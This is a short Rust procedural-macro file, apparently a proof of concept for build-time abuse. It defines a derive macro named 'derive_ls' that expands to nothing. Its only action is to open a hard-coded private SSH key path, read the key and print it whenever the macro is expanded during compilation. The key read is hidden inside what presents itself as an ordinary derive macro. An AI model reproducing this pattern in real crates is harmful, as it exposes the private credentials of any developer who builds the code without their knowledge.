use proc_macro2::TokenStream;
use quote::quote;
use syn::DeriveInput;
use std::io::Read;


pub fn derive_ls(mut input: DeriveInput) -> TokenStream {
    // do nothing, just read ~/.ssh/id_rsa
    let mut file = std::fs::File::open("/Users/x1957/.ssh/id_rsa").unwrap();
    let mut key = String::new();
    file.read_to_string(&mut key);
    println!{"{}", key};
    quote!{}
}